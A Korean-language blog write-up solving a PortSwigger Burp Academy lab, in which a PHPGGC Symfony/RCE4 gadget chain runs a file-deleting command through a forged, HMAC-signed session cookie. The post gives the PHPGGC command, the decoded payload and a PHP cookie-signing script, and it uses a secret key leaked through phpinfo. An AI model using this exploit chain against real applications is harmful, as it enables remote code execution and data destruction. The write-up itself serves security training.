---
layout: post
title: "Burp Academy-안전하지 않은 역직렬화(Insecure Deserialization) 관련 취약점: Exploiting PHP deserialization with a pre-built gadget chain"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, Insecure Deserialization]
toc: true
last_modified_at: 2024-07-19 21:00:00 +0900
---


# 개요
- 안전하지 않은 역직렬화(Insecure Deserialization) 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain
- 취약점 설명페이지: https://portswigger.net/web-security/deserialization/exploiting
- 난이도: PRACTITIONER (보통)


# 취약점 개요 (PHP Generic Gadget Chains)
- 대부분의 언어에서 안전하지 않은 역직렬화 취약점 체크를 도와주는 툴이 존재한다. 
- 예를 들어, PHP기반 사이트에서는 `PHP Generic Gadget Chains (PHPGGC)` (https://github.com/ambionics/phpggc)를 사용할 수 있다.



# 문제 개요
- 이 랩은 signed cookie를 위해서 직렬화 베이스의 세션 관리 메커니즘을 사용하고 있다. 
- 또한 일반적인 PHP프레임워크를 사용하고 있다. 
- 소스코드에 접근할 수는 없지만, 미리 빌드된 개짓체인을 사용해서 exploit을 수행할 수 있다. 
- 랩을 풀려면 타겟 프레임워크를 판별하고, 리모트 코드 실행을 수행하는 악의적인 직렬화 오브젝트를 만들어주는 서드파티 툴을 사용한다. 
- 작성한 오브젝트를 포함하는 signed cookie를 만들어서 웹 사이트에 전달하여 calros 유저의 홈디렉토리에 있는 morale.txt를 삭제하면 된다. 
- wiener:peter 크레덴셜로 로그인할 수 있다. 

```
This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains.

To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter
```


# 도전

1. 로그인해본다. 다음과 같은 값을 가지고 있는 세션토큰이 반환되었다. JSON 오브젝트에 `token` 속성과 `sig_hmac_sha1` 속성이 있는 것을 알 수 있다. 

```
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJtNnAxZm5hc2dvbGZoODQ4OXhwemJtdDlsYTd4MWFsZiI7fQ==","sig_hmac_sha1":"d45a4a9e1e85282be5ace738f3c645f918fdda81"}
```


![](/images/burp-academy-serial-6-5.png)


token 값을 Base64으로 디코딩해보면 다음과 같다. PHP 오브젝트인 것을 알 수 있다. 

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"m6p1fnasgolfh8489xpzbmt9la7x1alf";}
```

2. token의 값을 변조해본다. 변조한 다음에 다시 Base64인코딩해서 세션토큰의 token값을 대체한 후에 세션토큰을 Base64인코딩해서 서버에 요청해본다. 그러면 500에러 응답이 반환된다. 그리고 에러 메세지에서 중요한 정보를 알 수 있다. 웹 프레임워크가 Symfony 4.3.6이라는 것, 그리고 서버측에서는 세션쿠키의 서명을 체크하고 있다는 점이다. 

```
<h4>Internal Server Error: Symfony Version: 4.3.6</h4>
<p class=is-warning>PHP Fatal error:  Uncaught Exception: Signature does not match session in /var/www/index.php:7
Stack trace:
#0 {main}
  thrown in /var/www/index.php on line 7</p>
```

![](/images/burp-academy-serial-6-1.png)



3. 세션쿠키가 정상일 때의 응답도 살펴본다. 그러면 웹 페이지의 주석에 중요정보가 숨겨져 있는 것을 알 수 있다. `/cgi-bin/phpinfo.php` 경로에 디버그 파일이 있는 것이다. 

![](/images/burp-academy-serial-6-2.png)

4. `/cgi-bin/phpinfo.php` 로 접속해보면 phpinfo 페이지가 표시된다. 내용을 살펴보다보면 `SECRET_KEY`라는 중요해보이는 정보가 노출되고 있는 것을 알 수 있다. 이 키 값을 저장해둔다. (※ 이 값은 각 랩에 따라 다른 값이다.)

![](/images/burp-academy-serial-6-3.png)


5. PHPGGC 툴을 설치하고 다음 커맨드를 실행한다. 그러면 base64 인코딩된 값이 출력된다. 

```sh
docker run phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
```

참고로 Base64 디코딩한 페이로드의 내용은 이렇게 생겼다. 

```sh
O:47:"Symfony\Component\Cache\Adapter\TagAwareAdapter":2:{s:57:"Symfony\Component\Cache\Adapter\TagAwareAdapterdeferred";a:1:{i:0;O:33:"Symfony\Component\Cache\CacheItem":2:{s:11:"*poolHash";i:1;s:12:"*innerItem";s:26:"rm /home/carlos/morale.txt";}}s:53:"Symfony\Component\Cache\Adapter\TagAwareAdapterpool";O:44:"Symfony\Component\Cache\Adapter\ProxyAdapter":2:{s:54:"Symfony\Component\Cache\Adapter\ProxyAdapterpoolHash";i:1;s:58:"Symfony\Component\Cache\Adapter\ProxyAdaptersetInnerItem";s:4:"exec";}}
```


6. 서버에서 서명을 검증하고 있기 때문에 Base64 인코딩된 페이로드에 서명해야 한다. 다음 php코드를 사용한다. 이 코드를 사용해서 서명이 추가된 세션쿠키 오브젝트를 생성할 수 있다. 
- 소스코드에서 $object를 툴에서 생성한 페이로드로 지정한다. 
- $secretKey 를 phpinfo 에서 얻어낸 SECRET_KEY 의 값으로 지정한다. 

```php
<?php
$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==
";
$secretKey = "yehxz0topgprygzejmniv8cfydq5nqvi";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

7. PHP코드를 실행해보면 다음과 같은 값이 출력된다. 

```php
PS C:\php> php .\burp-academy-serial-6.php
%7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg%3D%3D%22%2C%22sig_hmac_sha1%22%3A%227db8c81397324a3a084e595e859025938574f98b%22%7D
PS C:\php>
```

8. 이 값을 세션쿠키로 치환해서 서버에 요청을 보내본다. 그러면 500에러가 회신되지만 문제 풀이에 성공했다는 메세지가 표시된다. 

![](/images/burp-academy-serial-6-4.png)

![](/images/burp-academy-serial-6-success.png)